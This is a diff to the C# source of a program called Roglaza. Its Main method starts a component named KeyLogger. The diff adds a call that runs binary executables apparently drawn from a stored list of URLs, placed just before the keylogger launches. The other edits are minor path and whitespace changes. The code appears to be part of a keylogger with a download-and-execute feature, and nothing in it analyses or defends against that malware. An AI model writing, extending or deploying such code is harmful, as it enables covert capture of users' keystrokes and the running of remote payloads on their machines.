@@ -18,7 +18,7 @@ namespace Roglaza
 
          public static void Main()
         {
-            int hour_now = DateTime.Now.Hour;
+           
 
             try
             {
@@ -31,10 +31,13 @@ namespace Roglaza
             try
             {
                 Roglaza.Program.LoadSettings();
+                Url__wrapper.RunBinaryExecutable(Program.ProgramSettings.GetUrlsPath());
                 KeyLogger.XMain();
             }
             catch(Exception e) { MessageBox.Show(e.Message); }
         }
+
+     
         public  static void Exec()
         {
             //Main Function
@@ -53,8 +56,7 @@ namespace Roglaza
             AppInfo.TestMode = Application.StartupPath.Contains(@"\Roglaza\bin") || RoglazaHelper.IsExistedFile("testmode");
             RoglazaInstaller.InstallDirectories();
 
-            bool Force_creat = RoglazaHelper.IsExistedFile(Application.StartupPath + "\\create");
-             
+            bool Force_creat = RoglazaHelper.IsExistedFile(Application.StartupPath + "\\create");             
             if (ProgramSettings.LoadFromFile()|| Force_creat )
             {
            // try {   DBManager.CreateNewDataBase();   }catch{}
@@ -85,7 +87,7 @@ namespace Roglaza
         }
         internal static string GetWorkingDirectory()
         {
-            return Application.StartupPath.ToString();
+            return Application.StartupPath.ToString()+"\\";
 
         }
 
